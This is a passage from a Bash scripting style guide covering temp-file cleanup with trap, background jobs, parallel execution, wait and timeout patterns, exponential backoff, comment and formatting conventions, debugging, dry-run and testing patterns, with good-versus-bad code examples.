trap 'rm -f "$temp1" "$temp2"' EXIT

# ✓ BETTER - Cleanup function
declare -a TEMP_FILES=()
cleanup() {
  local -- file
  for file in "${TEMP_FILES[@]}"; do
    [[ -f "$file" ]] && rm -f "$file"
  done
}
trap cleanup EXIT

temp1=$(mktemp)
TEMP_FILES+=("$temp1")

temp2=$(mktemp)
TEMP_FILES+=("$temp2")

# ✗ WRONG - Using /tmp directly in script directory
temp_file="$SCRIPT_DIR"/temp.txt
# Problem: pollutes script directory

# ✓ CORRECT - Use system temp directory
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT

# ✗ WRONG - Removing temp directory without -r
temp_dir=$(mktemp -d)
trap 'rm "$temp_dir"' EXIT  # Fails if directory not empty!

# ✓ CORRECT - Use -rf for directories
temp_dir=$(mktemp -d) || die 1 'Failed to create temp directory'
trap 'rm -rf "$temp_dir"' EXIT
```

**Edge cases:**

**1. Cleanup on different exit conditions:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -- TEMP_FILE=''

cleanup() {
  local -i exit_code=$?

  if [[ -n "$TEMP_FILE" && -f "$TEMP_FILE" ]]; then
    if ((exit_code == 0)); then
      info 'Cleaning up (success)'
    else
      warn "Cleaning up (error: exit code $exit_code)"
    fi
    rm -f "$TEMP_FILE"
  fi

  return "$exit_code"
}

trap cleanup EXIT

main() {
  TEMP_FILE=$(mktemp) || die 1 'Failed to create temp file'
  readonly -- TEMP_FILE

  info "Using temp file ${TEMP_FILE@Q}"

  # Do work...

  # Cleanup happens automatically
  return 0
}

main "$@"
#fin
```

**2. Preserving temp files for debugging:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -i KEEP_TEMP=0
declare -a TEMP_FILES=()

cleanup() {
  local -i exit_code=$?
  local -- file

  if ((KEEP_TEMP)); then
    if ((${#TEMP_FILES[@]})); then
      info 'Keeping temp files for debugging:'
      for file in "${TEMP_FILES[@]}"; do
        info "  $file"
      done
    fi
  else
    for file in "${TEMP_FILES[@]}"; do
      [[ -f "$file" ]] && rm -f "$file" ||:
      [[ -d "$file" ]] && rm -rf "$file" ||:
    done
  fi

  return "$exit_code"
}

trap cleanup EXIT

main() {
  # Parse --keep-temp option
  while (($#)); do
    case $1 in
      --keep-temp) KEEP_TEMP=1 ;;
      *) break ;;
    esac
    shift
  done

  readonly -- KEEP_TEMP

  local -- temp_file
  temp_file=$(mktemp)
  TEMP_FILES+=("$temp_file")

  echo 'Debug data' > "$temp_file"

  # If --keep-temp specified, files preserved
}

main "$@"
#fin
```

**3. Temp files in specific directory:**

```bash
# Create temp file in specific directory
temp_file=$(mktemp "$SCRIPT_DIR"/temp.XXXXXX) ||
  die 1 'Failed to create temp file in script directory'

trap 'rm -f "$temp_file"' EXIT

# Create temp directory in specific location
temp_dir=$(mktemp -d "$HOME"/work/temp.XXXXXX) ||
  die 1 'Failed to create temp directory'

trap 'rm -rf "$temp_dir"' EXIT
```

**4. Multiple trap handlers:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -a TEMP_FILES=()

# Cleanup temp files
cleanup_temp() {
  local -- file
  for file in "${TEMP_FILES[@]}"; do
    [[ -f "$file" ]] && rm -f "$file" ||:
    [[ -d "$file" ]] && rm -rf "$file" ||:
  done
}

# Other cleanup
cleanup_other() {
  # Other cleanup tasks
  info 'Performing other cleanup'
}

# Combined cleanup
cleanup() {
  local -i exit_code=$?

  cleanup_temp
  cleanup_other

  return "$exit_code"
}

trap cleanup EXIT

main() {
  local -- temp_file
  temp_file=$(mktemp)
  TEMP_FILES+=("$temp_file")

  # Do work...
}

main "$@"
#fin
```

**5. Handling signals:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -- TEMP_FILE=''

cleanup() {
  local -i exit_code=$?

  if [[ -n "$TEMP_FILE" && -f "$TEMP_FILE" ]]; then
    rm -f "$TEMP_FILE"
  fi

  return "$exit_code"
}

# Cleanup on normal exit and signals
trap cleanup EXIT SIGINT SIGTERM

main() {
  TEMP_FILE=$(mktemp) || die 1 'Failed to create temp file'
  readonly -- TEMP_FILE

  info 'Press Ctrl-C to test signal handling'

  # Simulate long-running operation
  local -i i
  for ((i=1; i<=60; i+=1)); do
    echo "Working... $i"
    sleep 1
  done

  # Cleanup happens even if interrupted
}

main "$@"
#fin
```

**Summary:**

- **Always use mktemp** - never hard-code temp file paths
- **Use trap for cleanup** - ensure cleanup happens even on failure
- **Register all temp resources** - in array or cleanup function
- **EXIT trap is mandatory** - automatic cleanup when script ends
- **Check mktemp success** - `|| die` to handle creation failure
- **Default permissions are secure** - mktemp creates 0600 files, 0700 directories
- **Template support** - use custom templates for recognizable temp files
- **Keep variables readonly** - prevent accidental modification
- **Cleanup function pattern** - for multiple temp files/directories
- **--keep-temp option** - useful for debugging
- **Signal handling** - trap SIGINT SIGTERM for interruption cleanup
- **Verify security** - check permissions and ownership if handling sensitive data

**Key principle:** Temporary files are a common source of security vulnerabilities and resource leaks. Always use mktemp for creation (never hard-code paths), always use trap EXIT for cleanup (never rely on manual cleanup), and always verify that cleanup actually occurs. The combination of mktemp + trap EXIT is the gold standard for temp file handling in Bash - it's atomic, secure, and guarantees cleanup even when scripts fail or are interrupted.


---


**Rule: BCS1100**

# Concurrency & Jobs

This section covers parallel execution patterns, background job management, and robust waiting strategies for Bash 5.2+.

**5 Rules:**

1. **Background Jobs** (BCS1101) - Managing `&`, process groups, and cleanup
2. **Parallel Execution** (BCS1102) - Running tasks concurrently with output capture
3. **Wait Patterns** (BCS1103) - `wait -n`, error collection, selective waiting
4. **Timeout Handling** (BCS1104) - Using `timeout` command, exit codes 124/125
5. **Exponential Backoff** (BCS1105) - Retry patterns with increasing delays

**Key principle:** Always clean up background jobs and handle partial failures gracefully.


---


**Rule: BCS1101**

### Background Job Management

**Rule: BCS1101**

Managing background processes, job control, and process lifecycle in Bash scripts.

---

#### Rationale

Background jobs enable:
- Non-blocking execution of long-running commands
- Parallel processing for improved performance
- Responsive scripts that can handle multiple tasks
- Proper resource cleanup on script termination

---

#### Starting Background Jobs

```bash
# Basic background execution
long_running_command &
declare -i pid=$!

# Track multiple jobs
declare -a pids=()
for file in "${files[@]}"; do
  process_file "$file" &
  pids+=($!)
done
```

#### Checking Process Status

```bash
# Check if process is running (signal 0 = existence check)
if kill -0 "$pid" 2>/dev/null; then
  info "Process $pid is still running"
fi

# Get process state from /proc
if [[ -d /proc/"$pid" ]]; then
  state=$(< /proc/"$pid"/stat)
fi
```

#### Waiting for Jobs

```bash
# Wait for specific PID
wait "$pid"
exit_code=$?

# Wait for all background jobs
wait

# Wait for any job to complete (Bash 4.3+)
wait -n
```

#### Cleanup Pattern

```bash
declare -a PIDS=()

cleanup() {
  local -i exitcode=${1:-0}
  trap - SIGINT SIGTERM EXIT  # Prevent recursion

  # Kill any remaining background jobs
  for pid in "${PIDS[@]}"; do
    kill "$pid" 2>/dev/null || true
  done

  exit "$exitcode"
}
trap 'cleanup $?' SIGINT SIGTERM EXIT

# Start jobs
for task in "${tasks[@]}"; do
  run_task "$task" &
  PIDS+=($!)
done

# Wait for completion
for pid in "${PIDS[@]}"; do
  wait "$pid" || true
done
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - no PID tracking
command &
# Later cannot manage or wait for it

# ✓ Correct - always track PIDs
command &
pid=$!
```

```bash
# ✗ Wrong - using $$ in background job
command &
echo "Started $$"  # This is parent PID, not child

# ✓ Correct - use $! for last background PID
command &
echo "Started $!"
```

---

**See Also:** BCS1102 (Parallel Execution), BCS1103 (Wait Patterns), BCS1104 (Timeout Handling)

**Full implementation:** See `examples/exemplar-code/oknav/oknav` lines 475-510


---


**Rule: BCS1102**

### Parallel Execution Patterns

**Rule: BCS1102**

Executing multiple commands concurrently while maintaining control and collecting results.

---

#### Rationale

Parallel execution provides:
- Significant speedup for I/O-bound tasks
- Better resource utilization
- Responsive handling of multiple operations
- Efficient batch processing

---

#### Basic Parallel Pattern

```bash
declare -a pids=()

# Start jobs in parallel
for server in "${servers[@]}"; do
  run_command "$server" "$@" &
  pids+=($!)
done

# Wait for all to complete
for pid in "${pids[@]}"; do
  wait "$pid" || true
done
```

#### Parallel with Output Capture

```bash
declare -- temp_dir
temp_dir=$(mktemp -d)
trap 'rm -rf "$temp_dir"' EXIT

declare -a pids=()

for server in "${servers[@]}"; do
  {
    result=$(run_command "$server" 2>&1)
    echo "$result" > "$temp_dir/$server.out"
  } &
  pids+=($!)
done

# Wait then display in order
for pid in "${pids[@]}"; do
  wait "$pid" || true
done

# Output results in original order
for server in "${servers[@]}"; do
  [[ -f "$temp_dir"/"$server".out ]] && cat "$temp_dir"/"$server".out
done
```

#### Parallel with Concurrency Limit

```bash
declare -i max_jobs=4
declare -a pids=()

local -a active=()
for task in "${tasks[@]}"; do
  # Wait if at max concurrency
  while ((${#pids[@]} >= max_jobs)); do
    wait -n 2>/dev/null || true
    # Remove completed PIDs
    active=()
    for pid in "${pids[@]}"; do
      kill -0 "$pid" 2>/dev/null && active+=("$pid")
    done
    pids=("${active[@]}")
  done

  process_task "$task" &
  pids+=($!)
done

# Wait for remaining
wait
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - variable lost in subshell
count=0
for task in "${tasks[@]}"; do
  { process "$task"; count+=1; } &
done
wait
echo "$count"  # Always 0!

# ✓ Correct - use temp files for results
for task in "${tasks[@]}"; do
  { process "$task" && echo 1 >> "$temp_dir"/count; } &
done
wait
count=$(wc -l < "$temp_dir"/count)
```

---

**See Also:** BCS1101 (Background Jobs), BCS1103 (Wait Patterns)

**Full implementation:** See `examples/exemplar-code/oknav/oknav` lines 465-530


---


**Rule: BCS1103**

### Wait Patterns

**Rule: BCS1103**

Proper synchronization when waiting for background processes.

---

#### Rationale

Proper wait handling ensures:
- All resources are cleaned up
- Exit codes are captured correctly
- Scripts don't hang on failed processes
- Graceful handling of interrupted waits

---

#### Basic Wait

```bash
# Wait for specific PID and capture exit code
command &
pid=$!
wait "$pid"
exit_code=$?
```

#### Wait for All Jobs

```bash
# Wait for all background jobs
wait

# With error tracking
declare -i errors=0
for pid in "${pids[@]}"; do
  wait "$pid" || errors+=1
done
((errors)) && warn "$errors jobs failed" ||:
```

#### Wait for Any (Bash 4.3+)

```bash
# Wait for first job to complete
declare -a pids=()
for task in "${tasks[@]}"; do
  process_task "$task" &
  pids+=($!)
done

# Process as they complete
local -a active=()
while ((${#pids[@]} > 0)); do
  wait -n
  exit_code=$?
  # Handle completion...

  # Update active PIDs list
  active=()
  for pid in "${pids[@]}"; do
    kill -0 "$pid" 2>/dev/null && active+=("$pid")
  done
  pids=("${active[@]}")
done
```

#### Wait with Error Collection

```bash
declare -A exit_codes=()

for server in "${servers[@]}"; do
  run_command "$server" &
  exit_codes[$server]=$!
done

declare -i failures=0
for server in "${!exit_codes[@]}"; do
  pid=${exit_codes[$server]}
  if ! wait "$pid"; then
    exit_codes[$server]=$?
    failures+=1
  else
    exit_codes[$server]=0
  fi
done

((failures)) && error "$failures servers failed"
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - ignoring wait return value
command &
wait $!  # Exit code lost

# ✓ Correct - capture and use exit code
command &
wait $! || die 1 'Command failed'
```

---

**See Also:** BCS1101 (Background Jobs), BCS1102 (Parallel Execution)


---


**Rule: BCS1104**

### Timeout Handling

**Rule: BCS1104**

Managing command timeouts and handling timeout conditions gracefully.

---

#### Rationale

Timeout handling prevents:
- Scripts hanging on unresponsive commands
- Resource exhaustion from stuck processes
- Poor user experience with indefinite waits
- Cascading failures in automated systems

---

#### Basic Timeout

```bash
# Simple timeout (coreutils)
if timeout 30 long_running_command; then
  success 'Command completed'
else
  exit_code=$?
  if ((exit_code == 124)); then
    warn 'Command timed out'
  else
    error "Command failed with exit code $exit_code"
  fi
fi
```

#### Timeout with Signal Selection

```bash
# Send SIGTERM first, SIGKILL after grace period
timeout --signal=TERM --kill-after=10 60 command

# Common timeout exit codes:
# 124 - command timed out
# 125 - timeout command itself failed
# 126 - command found but not executable
# 127 - command not found
# 137 - killed by SIGKILL (128 + 9)
```

#### Timeout with Variable Duration

```bash
declare -i TIMEOUT=${TIMEOUT:-30}

run_with_timeout() {
  local -i timeout_sec=$1; shift

  if ! timeout "${timeout_sec}s" "$@"; then
    local -i exit_code=$?
    case $exit_code in
      124) warn "Timed out after ${timeout_sec}s" ;;
      125) error 'Timeout command failed' ;;
      *)   error "Failed with exit code $exit_code" ;;
    esac
    return "$exit_code"
  fi
}

run_with_timeout "$TIMEOUT" ssh "$server" "$command"
```

#### Read with Timeout

```bash
# User input with timeout
if read -r -t 10 -p 'Enter value: ' value; then
  info "Got: $value"
else
  warn 'Input timed out, using default'
  value='default'
fi
```

#### Connection Timeout Pattern

```bash
# SSH with connection timeout
ssh -o ConnectTimeout=10 -o BatchMode=yes "$server" "$command"

# curl with timeout
curl --connect-timeout 10 --max-time 60 "$url"
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - no timeout on network operations
ssh "$server" 'long_command'  # May hang forever

# ✓ Correct - always timeout network operations
timeout 300 ssh -o ConnectTimeout=10 "$server" 'long_command'
```

---

**See Also:** BCS1105 (Exponential Backoff)

**Full implementation:** See `examples/exemplar-code/oknav/oknav` line 676


---


**Rule: BCS1105**

### Exponential Backoff

**Rule: BCS1105**

Implementing retry logic with exponential delay for transient failures.

---

#### Rationale

Exponential backoff provides:
- Graceful handling of transient failures
- Reduced load on failing services
- Automatic recovery without manual intervention
- Configurable retry behavior

---

#### Basic Exponential Backoff

```bash
retry_with_backoff() {
  local -i max_attempts=${1:-5}
  local -i attempt=1
  shift

  while ((attempt <= max_attempts)); do
    if "$@"; then
      return 0
    fi

    local -i delay=$((2 ** attempt))
    warn "Attempt $attempt failed, retrying in ${delay}s..."
    sleep "$delay"
    attempt+=1
  done

  error "Failed after $max_attempts attempts"
  return 1
}

retry_with_backoff 5 curl -f "$url"
```

#### With Maximum Delay Cap

```bash
retry_with_backoff() {
  local -i max_attempts=5
  local -i max_delay=60
  local -i attempt=1
  local -i delay

  while ((attempt <= max_attempts)); do
    if "$@"; then
      return 0
    fi

    delay=$((2 ** attempt))
    ((delay > max_delay)) && delay=$max_delay ||:

    ((VERBOSE)) && info "Retry $attempt in ${delay}s..." ||:
    sleep "$delay"
    attempt+=1
  done

  return 1
}
```

#### With Jitter (Randomization)

```bash
# Add randomization to prevent thundering herd
retry_with_jitter() {
  local -i max_attempts=5
  local -i attempt=1

  local -i base_delay jitter delay

  while ((attempt <= max_attempts)); do
    if "$@"; then
      return 0
    fi

    base_delay=$((2 ** attempt))
    jitter=$((RANDOM % base_delay))
    delay=$((base_delay + jitter))

    sleep "$delay"
    attempt+=1
  done

  return 1
}
```

#### Claude AI Retry Pattern

From BCS compress implementation:

```bash
local -i attempt=1 max_attempts=3

while ((attempt <= max_attempts)); do
  if claude --print ... > "$temp_file" 2>&1; then
    if [[ -s "$temp_file" ]]; then
      # Success - non-empty output
      break
    fi
    warn 'Empty response, retrying...'
  fi

  sleep $((2 ** attempt))
  attempt+=1
done

((attempt > max_attempts)) && die 1 'Max retries exceeded' ||:
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - fixed delay
while ! command; do
  sleep 5  # Same delay every time
done

# ✓ Correct - exponential backoff
declare -i attempt=1
while ! command; do
  sleep $((2 ** attempt))
  attempt+=1
  ((attempt > 5)) && break ||:
done
```

```bash
# ✗ Wrong - immediate retry floods service
while ! curl "$url"; do :; done

# ✓ Correct - backoff prevents flooding
retry_with_backoff 5 curl -f "$url"
```

---

**See Also:** BCS1104 (Timeout Handling), BCS1101 (Background Jobs)

**Full implementation:** See `examples/exemplar-code/checkpoint` lines 850-870


---


**Rule: BCS1200**

# Style & Development

This section covers code formatting, documentation practices, and development patterns for maintainable Bash scripts.

**10 Rules:**

1. **Code Formatting** (BCS1201) - Indentation, line length, structure
2. **Comments** (BCS1202) - Comment style and placement
3. **Blank Lines** (BCS1203) - Whitespace for readability
4. **Section Markers** (BCS1204) - Visual section delimiters
5. **Language Practices** (BCS1205) - Bash-specific idioms
6. **Development Practices** (BCS1206) - Version control, testing habits
7. **Debugging** (BCS1207) - Debug output and tracing
8. **Dry-Run Mode** (BCS1208) - Safe preview of destructive operations
9. **Testing** (BCS1209) - Test structure and assertions
10. **Progressive State** (BCS1210) - Multi-stage operation tracking

**Key principle:** Consistent formatting and documentation make scripts maintainable by both humans and AI assistants.


---


**Rule: BCS1201**

## Code Formatting

#### Indentation
- !! Use 2 spaces for indentation (NOT tabs)
- Maintain consistent indentation throughout

#### Line Length
- Keep lines under 100 characters when practical
- Long file paths and URLs can exceed 100 chars when necessary
- Use line continuation with `\` for long commands


---


**Rule: BCS1202**

## Comments

Focus comments on explaining **WHY** (rationale, business logic, non-obvious decisions) rather than **WHAT** (which the code already shows):

```bash
# Section separator (80 dashes)
# --------------------------------------------------------------------------------

# ✓ Good - explains WHY (rationale and special cases)
# PROFILE_DIR intentionally hardcoded to /etc/profile.d for system-wide bash profile
# integration, regardless of PREFIX. This ensures builtins are available in all
# user sessions. To override, modify this line or use a custom install method.
declare -- PROFILE_DIR=/etc/profile.d

((max_depth > 0)) || max_depth=255  # -1 means unlimited (WHY -1 is special)

# If user explicitly requested --builtin, try to install dependencies
if ((BUILTIN_REQUESTED)); then
  warn 'bash-builtins package not found, attempting to install...'
fi

# ✗ Bad - restates WHAT the code already shows
# Set PROFILE_DIR to /etc/profile.d
declare -- PROFILE_DIR=/etc/profile.d

# Check if max_depth is greater than 0, otherwise set to 255
((max_depth > 0)) || max_depth=255

# If BUILTIN_REQUESTED is non-zero
if ((BUILTIN_REQUESTED)); then
  # Print warning message
  warn 'bash-builtins package not found, attempting to install...'
fi
```

**Good comment patterns:**
- Explain non-obvious business rules or edge cases
- Document intentional deviations from normal patterns
- Clarify complex logic that isn't immediately apparent
- Note why a specific approach was chosen over alternatives
- Warn about subtle gotchas or side effects

**Avoid commenting:**
- Simple variable assignments
- Obvious conditionals
- Standard patterns already documented in this style guide
- Code that is self-explanatory through good naming

**Emoticons:**
In codebase documentation, internal and external, you may use any of these icons:

     info    ◉
     debug   ⦿
     warn    ▲
     success ✓
     error   ✗ 

Avoid use of any other icon/emoticon unless it can be justified.


---


**Rule: BCS1203**

## Blank Line Usage

Use blank lines strategically to improve readability by creating visual separation between logical blocks:

```bash
#!/bin/bash
set -euo pipefail

# Script metadata
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*}
                                          # ← Blank line after metadata group

# Default values                          # ← Blank line before section comment
declare -- PREFIX=/usr/local
declare -i DRY_RUN=0
                                          # ← Blank line after variable group

# Derived paths
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib
                                          # ← Blank line before function
check_prerequisites() {
  info 'Checking prerequisites...'

  # Check for gcc                         # ← Blank line after info call
  if ! command -v gcc &> /dev/null; then
    die 1 "'gcc' compiler not found."
  fi

  success 'Prerequisites check passed'    # ← Blank line between checks
}
                                          # ← Blank line between functions
main() {
  check_prerequisites
  install_files
}

main "$@"
#fin
```

**Guidelines:**
- One blank line between functions
- One blank line between logical sections within functions
- One blank line after section comments
- One blank line between groups of related variables
- Blank lines before and after multi-line conditional or loop blocks
- Avoid multiple consecutive blank lines (one is sufficient)
- No blank line needed between short, related statements


---


**Rule: BCS1204**

## Section Comments

Use lightweight section comments to organize code into logical groups. These are simpler than full 80-dash separators and provide just enough context:

```bash
# Default values
declare -- PREFIX=/usr/local
declare -i VERBOSE=1
declare -i DRY_RUN=0

# Derived paths
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib
declare -- DOC_DIR="$PREFIX"/share/doc

# Core message function
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  # ...
}

# Conditional messaging functions
vecho() { ((VERBOSE)) || return 0; _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# Unconditional messaging functions
error() { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

**Guidelines:**
- Use simple \`# Description\` format (no dashes, no box drawing)
- Keep section comments short and descriptive (2-4 words typically)
- Place section comment immediately before the group it describes
- Follow with a blank line after the group (before next section)
- Use for grouping related variables, functions, or logical blocks
- Reserve 80-dash separators for major script divisions only

**Common section comment patterns:**
- \`# Default values\` / \`# Configuration\`
- \`# Derived paths\` / \`# Computed variables\`
- \`# Core message function\`
- \`# Conditional messaging functions\` / \`# Unconditional messaging functions\`
- \`# Helper functions\` / \`# Utility functions\`
- \`# Business logic\` / \`# Main logic\`
- \`# Validation functions\` / \`# Installation functions\`


---


**Rule: BCS1205**

## Language Best Practices

#### Command Substitution
Always use `$()` instead of backticks for command substitution.

```bash
# ✓ Correct - modern syntax
var=$(command)
result=$(cat "$file" | grep pattern)

# ✗ Wrong - deprecated syntax
var=`command`
result=`cat "$file" | grep pattern`
```

**Rationale:**
- **Readability**: `$()` is visually clearer, especially with nested substitutions
- **Nesting**: `$()` nests naturally without escaping
- **Syntax highlighting**: Better editor support for `$()`
- **POSIX**: Both are POSIX, but `$()` is preferred in modern shells

**Nesting example:**
```bash
# ✓ Easy to read with $()
outer=$(echo "inner: $(date +%T)")

# ✗ Confusing with backticks (requires escaping)
outer=`echo "inner: \`date +%T\`"`
```

#### Builtin Commands vs External Commands
Always prefer shell builtins over external commands for performance and reliability.

```bash
# ✓ Good - bash builtins
addition=$((x + y))
string=${var^^}  # uppercase
string=${var,,}  # lowercase
if [[ -f "$file" ]]; then

# ✗ Avoid - external commands
addition=$(expr "$x" + "$y")
string=$(echo "$var" | tr '[:lower:]' '[:upper:]')
string=$(echo "$var" | tr '[:upper:]' '[:lower:]')
if [ -f "$file" ]; then
```

**Rationale:**
- **Performance**: Builtins are 10-100x faster (no process creation)
- **Reliability**: No dependency on external binaries or PATH
- **Portability**: Builtins guaranteed in bash, external commands might not be installed
- **Fewer failures**: No subshell creation, no pipe failures

**Performance comparison:**
```bash
# Builtin - instant
declare -i i result
for ((i=0; i<1000; i+=1)); do
  result=$((i * 2))
done

# External - much slower
for ((i=0; i<1000; i+=1)); do
  result=$(expr $i \* 2)  # Spawns 1000 processes!
done
```

**Common replacements:**

| External Command | Builtin Alternative | Example |
|-----------------|---------------------|---------|
| `expr` | `$(())` | `$((x + y))` instead of `$(expr $x + $y)` |
| `basename` | `${var##*/}` | `${path##*/}` instead of `$(basename "$path")` |
| `dirname` | `${var%/*}` | `${path%/*}` instead of `$(dirname "$path")` |
| `tr` (case) | `${var^^}` or `${var,,}` | `${str,,}` instead of `$(echo "$str" \| tr A-Z a-z)` |
| `test`/`[` | `[[` | `[[ -f "$file" ]]` instead of `[ -f "$file" ]` |
| `seq` | `{1..10}` or `for ((i=1; i<=10; i+=1))` | Much faster for loops |

**When external commands are necessary:**
```bash
# Some operations have no builtin equivalent
checksum=$(sha256sum "$file")
current_user=$(whoami)
sorted_data=$(sort "$file")
```


---


**Rule: BCS1206**

## Development Practices

#### ShellCheck Compliance
ShellCheck is **compulsory** for all scripts. Use `#shellcheck disable=...` only for documented exceptions.

```bash
# Document intentional violations with reason
#shellcheck disable=SC2046  # Intentional word splitting for flag expansion
set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}"

# Run shellcheck as part of development
shellcheck -x myscript.sh
```

#### Script Termination
```bash
# Always end scripts with #fin (or #end) marker
main "$@"
#fin

```

#### Defensive Programming
```bash
# Default values for critical variables
: "${VERBOSE:=0}"
: "${DEBUG:=0}"

# Validate inputs early
[[ -n "$1" ]] || die 1 'Argument required'

# Guard against unset variables
set -u
```

#### Performance Considerations
```bash
# Minimize subshells
# Use built-in string operations over external commands
# Batch operations when possible
# Use process substitution over temp files
```

#### Testing Support
```bash
# Make functions testable
# Use dependency injection for external commands
# Support verbose/debug modes
# Return meaningful exit codes
```


---


**Rule: BCS1207**

## Debugging and Development

Enable debugging features for development and troubleshooting.

```bash
# Debug mode implementation
declare -i DEBUG=${DEBUG:-0}

# Enable trace mode when DEBUG is set
((DEBUG)) && set -x ||:

# Enhanced PS4 for better trace output
export PS4='+ ${BASH_SOURCE##*/}:${LINENO}:${FUNCNAME[0]:+${FUNCNAME[0]}():} '

# Conditional debug output function
debug() {
  ((DEBUG)) || return 0
  >&2 _msg "$@"
}

# Usage
DEBUG=1 ./script.sh  # Run with debug output
```


---


**Rule: BCS1208**

## Dry-Run Pattern

Implement preview mode for operations that modify system state, allowing users to see what would happen without making actual changes.

```bash
# Declare dry-run flag
declare -i DRY_RUN=0

# Parse from command-line
-n|--dry-run) DRY_RUN=1 ;;
-N|--not-dry-run) DRY_RUN=0 ;;

# Pattern: Check flag, show preview message, return early
build_standalone() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would build standalone binaries'
    return 0
  fi

  # Actual build operations
  make standalone || die 1 'Build failed'
}

install_standalone() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would install:' \
         "  $BIN_DIR/mailheader" \
         "  $BIN_DIR/mailmessage" \
         "  $BIN_DIR/mailheaderclean"
    return 0
  fi

  # Actual installation operations
  install -m 755 build/bin/mailheader "$BIN_DIR"/
  install -m 755 build/bin/mailmessage "$BIN_DIR"/
  install -m 755 build/bin/mailheaderclean "$BIN_DIR"/
}

update_man_database() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would update man database'
    return 0
  fi

  # Actual man database update
  mandb -q 2>/dev/null || true
}
```

**Pattern structure:**
1. Check `((DRY_RUN))` at the start of functions that modify state
2. Display preview message with `[DRY-RUN]` prefix using `info`
3. Return early (exit code 0) without performing actual operations
4. Proceed with real operations only when dry-run is disabled

**Benefits:**
- Safe preview of destructive operations
- Users can verify paths, files, and commands before execution
- Useful for debugging installation scripts and system modifications
- Maintains identical control flow (same function calls, same logic paths)

**Rationale:** This pattern separates decision logic from action. The script flows through the same functions whether in dry-run mode or not, making it easy to verify logic without side effects.


---


**Rule: BCS1209**

## Testing Support Patterns

Patterns for making scripts testable.

```bash
# Dependency injection for testing
declare -f FIND_CMD >/dev/null || FIND_CMD() { find "$@"; }
declare -f DATE_CMD >/dev/null || DATE_CMD() { date "$@"; }
declare -f CURL_CMD >/dev/null || CURL_CMD() { curl "$@"; }

# In production
find_files() {
  FIND_CMD "$@"
}

# In tests, override:
FIND_CMD() { echo 'mocked_file1.txt mocked_file2.txt'; }

# Test mode flag
declare -i TEST_MODE="${TEST_MODE:-0}"

# Conditional behavior for testing
if ((TEST_MODE)); then
  # Use test data directory
  DATA_DIR=./test_data
  # Disable destructive operations
  RM_CMD() { echo "TEST: Would remove $*"; }
else
  DATA_DIR=/var/lib/app
  RM_CMD() { rm "$@"; }
fi

# Assert function for tests
assert() {
  local -- expected=$1
  local -- actual=$2
  local -- message=${3:-Assertion failed}

  if [[ "$expected" != "$actual" ]]; then
    >&2 echo "ASSERT FAIL: $message"
    >&2 echo "  Expected: '$expected'"
    >&2 echo "  Actual:   '$actual'"
    return 1
  fi
  return 0
}

# Test runner pattern
run_tests() {
  local -i passed=0 failed=0
  local -- test_func

  # Find all functions starting with test_
  for test_func in $(declare -F | awk '$3 ~ /^test_/ {print $3}'); do
    if "$test_func"; then
      passed+=1
      echo "✓ $test_func"
    else
      failed+=1
      echo "✗ $test_func"
    fi
  done

  echo "Tests: $passed passed, $failed failed"
  ((failed == 0))
}
```


---


**Rule: BCS1210**

## Progressive State Management

Manage script state by modifying boolean flags based on runtime conditions, separating decision logic from execution.

```bash
# Initial flag declarations
declare -i INSTALL_BUILTIN=0
declare -i BUILTIN_REQUESTED=0
declare -i SKIP_BUILTIN=0

# Parse command-line arguments
main() {
  while (($#)); do
    case $1 in
      --builtin)    INSTALL_BUILTIN=1
                    BUILTIN_REQUESTED=1
                    ;;
      --no-builtin) SKIP_BUILTIN=1
                    ;;
    esac
    shift
  done

  # Progressive state management: adjust flags based on runtime conditions

  # If user explicitly requested to skip, disable installation
  if ((SKIP_BUILTIN)); then
    INSTALL_BUILTIN=0
  fi

  # Check if prerequisites are met, adjust flags accordingly
  if ! check_builtin_support; then
    # If user explicitly requested builtins, try to install dependencies
    if ((BUILTIN_REQUESTED)); then
      warn 'bash-builtins package not found, attempting to install...'
      install_bash_builtins || {
        error 'Failed to install bash-builtins package'
        INSTALL_BUILTIN=0  # Disable builtin installation
      }
    else
      # User didn't explicitly request, just skip
      info 'bash-builtins not found, skipping builtin installation'
      INSTALL_BUILTIN=0
    fi
  fi

  # Build phase: disable on failure
